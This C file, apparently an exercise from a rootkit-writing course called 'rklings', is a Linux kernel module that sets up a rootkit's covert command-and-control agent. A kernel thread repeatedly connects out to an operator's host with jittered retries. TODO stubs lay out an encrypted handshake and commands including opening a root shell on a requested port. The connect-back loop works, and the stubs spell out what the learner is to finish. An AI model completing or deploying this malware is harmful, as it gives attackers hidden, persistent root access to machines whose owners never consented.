// SPDX-License-Identifier: GPL-2.0
#include <linux/err.h>
#include <linux/errno.h>
#include <linux/jiffies.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/random.h>
#include <linux/socket.h>
#include <linux/string.h>
#include <linux/uio.h>
#include <net/net_namespace.h>

#include "agent.h"
#include "root_shell.h"

static ssize_t rk_socket_send(struct socket *socket,
			      const unsigned char *bytes, size_t length,
			      void *context)
{
	struct msghdr message = { };
	struct kvec vector = {
		.iov_base = (void *)bytes,
		.iov_len = length,
	};

	(void)context;
	return kernel_sendmsg(socket, &message, &vector, 1, length);
}

static ssize_t rk_socket_receive(struct socket *socket, unsigned char *bytes,
				 size_t length, void *context)
{
	struct msghdr message = { };
	struct kvec vector = {
		.iov_base = bytes,
		.iov_len = length,
	};

	(void)context;
	return kernel_recvmsg(socket, &message, &vector, 1, length, 0);
}

static const struct rk_transport_ops rk_transport = {
	.send = rk_socket_send,
	.receive = rk_socket_receive,
};

static void rk_count_protocol_error(struct rk_agent *agent)
{
	mutex_lock(&agent->lock);
	agent->protocol_errors++;
	mutex_unlock(&agent->lock);
}

// TODO: Implement rk_agent_reply().
// This function seals the plaintext reply using rk_secure_seal_reply()
// into an envelope buffer, then sends the envelope as a frame.
// After sending, zeroize the envelope with memzero_explicit().
// Returns: 0 on success, negative errno on failure.

static int rk_agent_command(struct rk_agent *agent, struct socket *socket,
			    const unsigned char *payload, size_t payload_length,
			    bool *close_session)
{
	// TODO: Parse the command from payload, then handle each kind:
	// PING -> reply "PONG"
	// INFO -> reply "INFO rklings"
	// STATUS -> reply "STATUS connected=... attempts=..."
	// SHELL port -> rk_root_shell_request(), reply "OPEN ..." or "ERR busy"
	// SHELL STATUS -> rk_root_shell_snapshot(), reply "STATE ..."
	// QUIT -> set *close_session = true
	//
	// All replies go through rk_agent_reply() (sealed, not plaintext).
	(void)agent;
	(void)socket;
	(void)payload;
	(void)payload_length;
	*close_session = false;
	return -EPROTO;
}

static int rk_agent_serve(struct rk_agent *agent, struct socket *socket)
{
	// TODO: Implement the HELLO handshake and authenticated serve loop.
	//
	// 1. Generate a random non-zero session ID with get_random_u64()
	// 2. Start the secure channel: rk_secure_channel_start()
	// 3. Send sealed HELLO reply via rk_agent_reply()
	// 4. Loop: receive frame, open it with rk_secure_open_request()
	//    to get plaintext, pass plaintext to rk_agent_command()
	// 5. On error or quit: stop the secure channel, clear session
	//
	// The key difference from M03: every received frame is an encrypted
	// envelope that must be opened before parsing the command.
	(void)agent;
	(void)socket;
	return -ENOSYS;
}

static int rk_agent_attempt(struct rk_agent *agent)
{
	struct socket *socket = NULL;
	bool connected = false;
	bool shutdown_here = false;
	int error;

	error = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP,
				 &socket);
	if (error)
		return error;
	if (!socket)
		return -EPROTO;

	mutex_lock(&agent->lock);
	if (agent->stopping) {
		mutex_unlock(&agent->lock);
		sock_release(socket);
		return 0;
	}
	agent->active = socket;
	agent->shutdown_started = false;
	mutex_unlock(&agent->lock);

	error = kernel_connect(socket,
			       (struct sockaddr_unsized *)&agent->peer,
			       sizeof(agent->peer), 0);
	if (error)
		goto close;
	connected = true;
	mutex_lock(&agent->lock);
	agent->connected = true;
	agent->connections++;
	agent->retry_delay_ms = agent->retry_base_ms;
	mutex_unlock(&agent->lock);
	error = rk_agent_serve(agent, socket);

close:
	mutex_lock(&agent->lock);
	if (agent->active == socket)
		agent->active = NULL;
	agent->connected = false;
	if (connected && !agent->shutdown_started) {
		agent->shutdown_started = true;
		shutdown_here = true;
	}
	mutex_unlock(&agent->lock);
	if (shutdown_here)
		(void)kernel_sock_shutdown(socket, SHUT_RDWR);
	sock_release(socket);
	return error;
}

static int rk_agent_worker(void *argument)
{
	struct rk_agent *agent = argument;

	while (!kthread_should_stop()) {
		unsigned int delay;
		long waited;
		int error;

		mutex_lock(&agent->lock);
		agent->attempts++;
		mutex_unlock(&agent->lock);
		error = rk_agent_attempt(agent);
		if (kthread_should_stop())
			break;
		mutex_lock(&agent->lock);
		if (error)
			agent->transport_errors++;
		delay = agent->retry_delay_ms;
		agent->retries++;
		if (error)
			agent->retry_delay_ms = rk_retry_next(
				agent->retry_delay_ms, agent->retry_base_ms,
				agent->retry_max_ms);
		else
			agent->retry_delay_ms = agent->retry_base_ms;
		mutex_unlock(&agent->lock);
		delay += get_random_u32_below(delay / 4 + 1);
		waited = wait_event_interruptible_timeout(
			agent->retry_wait, kthread_should_stop(),
			msecs_to_jiffies(delay));
		(void)waited;
	}
	return 0;
}

int rk_agent_start(struct rk_agent *agent, __be32 peer_address, u16 peer_port,
		   unsigned int retry_base_ms, unsigned int retry_max_ms,
		   const u8 *key, size_t key_length,
		   struct rk_root_shell *shell)
{
	struct task_struct *task;

	if (!agent || !peer_address || !peer_port || !retry_base_ms ||
	    retry_base_ms > retry_max_ms || retry_max_ms > 5000 ||
	    !key || key_length != RK_AEAD_KEY_LENGTH || !shell)
		return -EINVAL;
	memset(agent, 0, sizeof(*agent));
	mutex_init(&agent->lock);
	init_waitqueue_head(&agent->retry_wait);
	agent->peer.sin_family = AF_INET;
	agent->peer.sin_addr.s_addr = peer_address;
	agent->peer.sin_port = htons(peer_port);
	agent->retry_base_ms = retry_base_ms;
	agent->retry_max_ms = retry_max_ms;
	agent->retry_delay_ms = retry_base_ms;
	memcpy(agent->key, key, sizeof(agent->key));
	agent->shell = shell;
	agent->initialized = true;
	task = kthread_create(rk_agent_worker, agent, "rkling_agent");
	if (IS_ERR(task)) {
		memzero_explicit(agent->key, sizeof(agent->key));
		agent->initialized = false;
		return PTR_ERR(task);
	}
	mutex_lock(&agent->lock);
	agent->task = task;
	mutex_unlock(&agent->lock);
	wake_up_process(task);
	return 0;
}

void rk_agent_stop(struct rk_agent *agent)
{
	struct task_struct *task;

	if (!agent || !READ_ONCE(agent->initialized))
		return;
	mutex_lock(&agent->lock);
	task = agent->task;
	if (!task) {
		mutex_unlock(&agent->lock);
		return;
	}
	agent->stopping = true;
	if (agent->active && !agent->shutdown_started) {
		agent->shutdown_started = true;
		(void)kernel_sock_shutdown(agent->active, SHUT_RDWR);
	}
	mutex_unlock(&agent->lock);
	wake_up_interruptible(&agent->retry_wait);
	(void)kthread_stop(task);
	mutex_lock(&agent->lock);
	agent->task = NULL;
	agent->connected = false;
	mutex_unlock(&agent->lock);
	memzero_explicit(agent->key, sizeof(agent->key));
}
